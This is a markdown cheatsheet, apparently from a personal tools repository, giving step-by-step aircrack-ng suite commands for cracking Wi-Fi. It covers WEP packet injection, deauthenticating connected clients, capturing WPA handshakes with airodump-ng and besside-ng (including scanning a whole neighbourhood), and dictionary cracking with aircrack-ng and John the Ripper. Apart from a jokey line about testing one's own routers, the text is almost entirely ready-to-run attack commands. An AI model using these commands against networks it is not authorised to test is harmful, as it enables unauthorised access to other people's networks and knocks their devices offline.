# Wifi

Here are some cheatsheets about wireless cracking. Easy stuff (just for
testing your own routers :P ).

## Common

First you have to put your interface in monitor mode:

```
airmon-ng # list interfaces
airmon-ng start wlan0 # this will create a mon0 interface which should be able to inject
```

Then, get the info of your router (and adjacents) with `airodump-ng mon0`.

When you get yours (should be WEP for this attack), note down ESSID, BSSID and Channel.

Now focus the sniff in your router:

`airodump-ng -a --ivs -w out --channel <channel> --bssid <bssid> mon0`
This will create an `out.cap` file and it will write only interesting packages (ivs).

## WEP

You can use my tool [wepcrackeator](https://github.com/serginator/unix-tools).
It's really easy to use and will guide you and launch the commands for you.

If you want to know what you are doing, then here are the commands.

First execute what's in [Common](#Common) section.

Now we need to associate with the router, execute the following:

```
aireplay-ng -1 6000 -o 1 -q 10 --ignore-negative-one -a <bssid> -h <mymac> mon0
```

Once associated, we are going to use the p0841 injection attack:

```
aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b <bssid> -h <mymac> --ignore-negative-one mon0
```

If you want to deauthenticate a client to get packages, use the following command:

```
aireplay-ng -0 5 -a <bssid> --ignore-negative-one mon0
```

And now you should be getting data for start the cracking process, if not maybe
you need to use other attack like ChopChop or fragmentation, just execute
`aireplay-ng --help` and see the other attacks, mayble a simple ARP injection
could do the trick.

Now launch aircrack-ng and let it cracking while getting data from the router:

```
aircrack-ng -a 1 out.cap
```

It will launch the cracking process when it gets more ivs, so just wait for it.

## WPA

WPA keys can be obtained using dictionaries (or bruteforce) against handshakes.

### Getting handshakes using airodump-ng and aireplay-ng

First execute what's in [Common](#Common) section.

Now we need a client to connect to the router. Connect your phone or other device
and you'll see the handshake on top of airodump-ng. If not, try to deauthenticate
a random client using aireplay-ng:

```
aireplay-ng -0 5 -a <bssid> mon0
```

or force a client to deauthenticate with:

```
aireplay-ng -0 5 -a <bssid> -c <client> mon0
```  

Once you get the handshake you can stop airodump-ng and start cracking it.

### Getting handshakes using besside-ng

Like in the previous method, first put your interface in monitor mode:

```
airmon-ng # lists interfaces
airmon-ng start wlan0 # this will create a mon0 interface which should be able to inject
```

Then, to scan the whole neigborhood (not recommended) use the following command:

```
besside-ng -W -vv mon0
```

To scan an specific bssid (your router) use:

```
besside-ng -W -c <channel> -b <bssid> -vv <interface>
```

Both commands will create a file wpa.cap where you have executed the command.
This file will contain only handshakes, so you can crack it once you get it.

### Cracking the handshake

Just use `aircrack-ng` for the task:

```
aircrack-ng -w <dict-file> <cap-file> # where cap-file is out.cap in first example or wpa.cap in the second
```

If there are several handshakes of several routers, it will ask which one. You
can force it at the beginning adding `-b <bssid>` in the aircrack-ng command.

If you need to be able to pause aircrack-ng and resume it later you'll need to
make use of `John the Ripper` tool.

You should launch the cracking with this command:

```
john --session=wpa --stdout --wordlist=<dict-file> | aircrack-ng -w - -b <bssid> wpa.cap
```

To pause it just hit Ctrl+c once.

To restore it, use the following command:

```
john --restore=wpa | aircrack-ng -w - -b <bssid> wpa.cap
```

